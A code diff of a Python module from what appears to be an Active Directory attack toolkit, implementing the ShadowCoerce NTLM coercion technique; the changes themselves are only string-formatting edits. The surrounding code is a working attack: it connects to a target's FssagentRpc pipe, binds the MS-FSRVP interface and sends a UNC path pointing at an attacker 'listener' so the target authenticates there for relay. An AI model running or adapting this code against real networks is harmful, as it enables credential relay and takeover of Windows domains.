@@ -1,5 +1,4 @@
-"""ShadowCoerce — NTLM coercion via MS-FSRVP IsPathSupported/IsPathShadowCopied."""
-from __future__ import annotations
+"""ShadowCoerce  -  NTLM coercion via MS-FSRVP IsPathSupported/IsPathShadowCopied."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -23,7 +22,7 @@ def run(args: Any) -> int:
         print("[!] --listener required", file=sys.stderr)
         return 1
 
-    print("[*] ShadowCoerce: {} → coerce to {}".format(target, listener))
+    print(f"[*] ShadowCoerce: {target} → coerce to {listener}")
 
     try:
         from impacket.dcerpc.v5 import transport
@@ -35,7 +34,7 @@ def run(args: Any) -> int:
     FSRVP_UUID = uuid.uuidtup_to_bin(("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0"))
 
     try:
-        string_binding = "ncacn_np:{}[\\pipe\\FssagentRpc]".format(target)
+        string_binding = f"ncacn_np:{target}[\\pipe\\FssagentRpc]"
         rpc_transport = transport.DCERPCTransportFactory(string_binding)
 
         if cred.username:
@@ -47,7 +46,7 @@ def run(args: Any) -> int:
         dce.connect()
         dce.bind(FSRVP_UUID)
 
-        share_name = "\\\\{}\\share".format(listener)
+        share_name = f"\\\\{listener}\\share"
         import struct
         request = struct.pack("<I", len(share_name) + 1)
         request += struct.pack("<I", 0)
@@ -59,7 +58,7 @@ def run(args: Any) -> int:
         except Exception:
             pass
 
-        print("[+] ShadowCoerce triggered — check relay on {}".format(listener))
+        print(f"[+] ShadowCoerce triggered  -  check relay on {listener}")
         dce.disconnect()
         return 0
 
@@ -67,5 +66,5 @@ def run(args: Any) -> int:
         if "STATUS_OBJECT_NAME_NOT_FOUND" in str(exc):
             print("[-] FSRVP service not available on target")
             return 1
-        print("[+] ShadowCoerce likely triggered: {}".format(exc))
+        print(f"[+] ShadowCoerce likely triggered: {exc}")
         return 0
